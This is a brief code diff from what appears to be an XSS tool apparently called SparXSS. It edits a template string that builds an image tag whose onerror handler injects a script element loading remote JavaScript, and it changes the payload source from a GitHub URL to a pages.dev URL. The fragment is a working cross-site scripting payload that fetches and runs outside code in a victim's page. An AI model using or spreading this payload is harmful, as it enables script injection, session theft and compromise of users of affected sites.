@@ -793,7 +793,7 @@ if (typeof executed === 'undefined') {
 
                 var codeBeginning = `
                     <img src="#" onerror="var scriptElement = document.createElement('script');
-                    scriptElement.src = 'https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js';
+                    scriptElement.src = 'https://sparxss.pages.dev/Testing/test4.js';
                     scriptElement.onload = function () {
                 `;
                 
